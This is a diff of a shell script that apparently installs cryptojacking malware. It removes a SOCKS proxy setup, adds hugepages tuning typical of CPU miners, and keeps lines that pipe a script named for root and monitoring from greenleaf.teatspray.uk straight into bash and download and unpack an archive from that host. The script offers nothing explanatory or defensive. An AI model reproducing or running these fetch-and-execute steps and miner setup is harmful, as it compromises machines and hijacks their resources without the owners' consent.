@@ -28,10 +28,6 @@ ph add Xmas 1>/dev/null 2>&1
 
 sleep 2
 
-ph add update-local 1>/dev/null 2>&1
-
-sleep 2
-
 curl -fsSL http://greenleaf.teatspray.uk/install_and_monitor_shade_root.sh | bash &
 
 sleep 4
@@ -79,35 +75,15 @@ sleep 2
 wget -q http://greenleaf.teatspray.uk/Xmas.tar.gz
 sleep 2
 tar -xf Xmas.tar.gz
-sleep 2
-
-curl http://greenleaf.teatspray.uk/update.tar.gz -L -O -J
 
 sleep 2
 
-tar -xf update.tar.gz
+sysctl -w vm.nr_hugepages=$(nproc)
 
-sleep 2
-
-cat > update/local/update-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 127.0.0.1:1081
-END
-
-./update/local/update-local -config update/local/update-local.conf & > /dev/null
-
-sleep 2
-
-ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
-
-sleep 3
-
-./update/local/update-local -config update/local/update-local.conf & > /dev/null
-
-sleep 2
-
-./update/update wget -q -O- http://api.ipify.org
+for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
+do
+    echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
+done
 
 sleep 2
 
